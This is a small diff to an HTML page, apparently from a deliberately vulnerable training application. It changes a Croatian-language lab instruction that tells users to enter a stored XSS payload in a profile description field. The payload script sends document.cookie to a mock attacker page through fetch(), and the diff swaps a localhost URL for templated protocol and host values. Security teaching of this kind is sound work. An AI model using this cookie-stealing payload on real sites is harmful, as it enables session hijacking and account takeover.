@@ -204,7 +204,7 @@
                     <p>• Kada je XSS ranjivost omogućena, unesite sljedeći kod u polje za opis profila:</p>
                     <div class="code-block">
     <pre><code>&lt;script&gt;
-        fetch('http://localhost:3000/mock-hacker-page?message=' + document.cookie);
+        fetch('<%= protocol %>://<%= host %>/mock-hacker-page?message=' + document.cookie);
 &lt;/script&gt;</code></pre>
                     </div>
                 </div>
